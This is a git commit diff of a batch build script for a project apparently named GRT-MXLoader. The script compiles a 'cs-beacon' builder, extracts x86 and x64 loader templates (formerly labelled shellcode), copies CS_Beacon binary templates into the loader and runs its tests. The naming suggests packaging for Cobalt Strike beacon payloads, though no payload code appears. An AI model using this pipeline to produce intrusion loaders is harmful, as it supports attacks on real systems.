7da4184713a3d984c019c44d227ffbc88a7d2edf
For-ACGN <38399410+For-ACGN@users.noreply.github.com>
2026-09-01 13:37:32 +0800

    rewrite build script about extract loader template and test go package.

--- Build.bat
+++ Build.bat
@@ -7,34 +7,46 @@ if "%VisualStudio%" == "" (
 )
 call "%VisualStudio%\VC\Auxiliary\Build\vcvars64.bat"
 
-echo ================= clean builder old files ================
-rd /S /Q "builder\cs-beacon\Release"
-rd /S /Q "builder\cs-beacon\x64"
+echo ================== clean outdated dist ===================
+del /S /Q dist
+
+echo =============== clean outdated build files ===============
 rd /S /Q "Release"
 rd /S /Q "x64"
+rd /S /Q "builder\cs-beacon\Release"
+rd /S /Q "builder\cs-beacon\x64"
 
 echo ==================== generate builder ====================
 MSBuild.exe GRT-MXLoader.sln /t:cs-beacon /p:Configuration=Release /p:Platform=x86
 MSBuild.exe GRT-MXLoader.sln /t:cs-beacon /p:Configuration=Release /p:Platform=x64
 
-echo ================ extract loader shellcode ================
-del /S /Q dist
+echo ================ extract loader template =================
 cd builder\cs-beacon
-echo --------extract shellcode for x86--------
+echo --------extract template for x86--------
 "..\..\Release\cs-beacon.exe"
-echo --------extract shellcode for x64--------
+echo --------extract template for x64--------
 "..\..\x64\Release\cs-beacon.exe"
 cd ..\..
 
-echo ================= clean builder old files ================
-rd /S /Q "builder\cs-beacon\Release"
-rd /S /Q "builder\cs-beacon\x64"
+echo ================= copy standard template =================
+copy /Y dist\standard\CS_Beacon_*.bin loader\beacon\template
+
+echo =================== clean build files ====================
 rd /S /Q "Release"
 rd /S /Q "x64"
+rd /S /Q "builder\cs-beacon\Release"
+rd /S /Q "builder\cs-beacon\x64"
 
-echo ===================== test shellcode =====================
+echo =================== test loader package ==================
 call test.bat
+if errorlevel 1 (
+    echo.
+    echo failed to test loader package!
+    pause
+    exit /b %ERRORLEVEL%
+)
 
 echo ==========================================================
-echo                  build shellcode finish!
+echo                 build template finish!
 echo ==========================================================
+pause
